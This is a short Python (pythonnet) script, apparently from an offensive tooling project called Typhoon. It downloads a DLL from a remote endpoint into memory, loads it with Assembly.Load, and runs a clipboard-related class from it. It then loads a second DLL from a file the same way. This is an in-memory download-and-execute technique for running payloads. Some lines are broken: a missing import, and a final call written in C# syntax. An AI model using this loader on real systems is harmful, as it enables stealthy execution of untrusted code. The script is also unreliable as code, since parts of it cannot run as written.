import clr

clr.AddReference("System")
clr.AddReference("System.IO.Compression")
from System.Net import WebClient
from System.Net import ServicePointManager, SecurityProtocolType

## We could downlaod a zip and unwrap it:
# from System.IO import Stream, StreamReader, MemoryStream, BinaryWriter, FileStream, File
# from System.IO.Compression import ZipArchive, ZipArchiveMode


## Download a dll to memory from the remote endpoint, load it up in memroy
with WebClient() as wc:
    ServicePointManager.SecurityProtocol  = SecurityProtocolType.Tls12
    dll = wc.DownloadData("http://127.0.0.1:8000/tmpB1B9.dll")
    ## This is how we get .Net and Python typres from an object
    print(".Net Type: ", clr.GetClrType(type(dll)) )
    print("Python Type: ",  type(dll) )


from System.Reflection import Assembly 
# Byte loading assembly
clr.AddReference(Assembly.Load(dll))
from Typhoon.Extensions import ClipboardManager

cm = ClipboardManager()
cm.RunCode()

## Load dll from file
assemblyName="tmpC016.dll"

#from System.Environment import CurrentDirectory 
#from System.IO import Path, Directory, File
clr.AddReference(Assembly.Load(File.ReadAllBytes(assemblyName)))
from Typhoon import DynamicDllImport

DynamicDllImport("user32.dll", callingConvention: CallingConvention.Winapi);




